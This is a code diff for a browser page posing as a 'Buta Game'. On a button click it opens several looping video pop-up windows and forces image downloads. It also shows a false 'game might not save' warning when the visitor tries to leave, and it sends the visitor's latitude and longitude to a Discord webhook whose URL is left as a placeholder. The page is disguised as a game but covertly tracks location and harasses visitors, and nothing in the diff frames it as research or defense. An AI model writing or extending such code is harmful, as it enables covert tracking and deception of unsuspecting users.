@@ -2,16 +2,18 @@ document.getElementById('playButton').addEventListener('click', function() {
     const videoFiles = [
         'videos/video1.mp4',
         'videos/video2.mp4',
-        'videos/video3.mp4'
+        'videos/video3.mp4',
+        'videos/video4.mp4',
+        'videos/video5.mp4' // Added fifth video
     ];
 
-    // Open 3 moving tabs
+    // Open 5 moving tabs
     videoFiles.forEach((url, index) => {
         const newWindow = window.open('', 'Buta Game', 'width=400,height=300');
         if (newWindow) {
             newWindow.document.write(`
                 <title>Buta Game</title>
-                <video style="max-width: 100%;" autoplay>
+                <video style="max-width: 100%;" autoplay loop>
                     <source src="${url}" type="video/mp4">
                 </video>
                 <script>
@@ -49,6 +51,10 @@ document.getElementById('playButton').addEventListener('click', function() {
     // Hide button
     this.style.display = 'none';
 
+    // Trigger image downloads
+    downloadImage('images/image1.jpg', 'buta_image1.jpg');
+    downloadImage('images/image2.jpg', 'buta_image2.jpg');
+
     // Send location to Discord webhook
     sendLocationToWebhook();
 });
@@ -58,12 +64,22 @@ window.onbeforeunload = function() {
     return "Are you sure you want to close? Game might not save.";
 };
 
+// Function to download images
+function downloadImage(url, filename) {
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = filename;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+
 // Function to send location to Discord webhook
 function sendLocationToWebhook() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
             const { latitude, longitude } = position.coords;
-            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with your webhook URL
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
             const data = {
                 content: `User location: Latitude ${latitude}, Longitude ${longitude}`,
                 username: 'ButaGameBot'
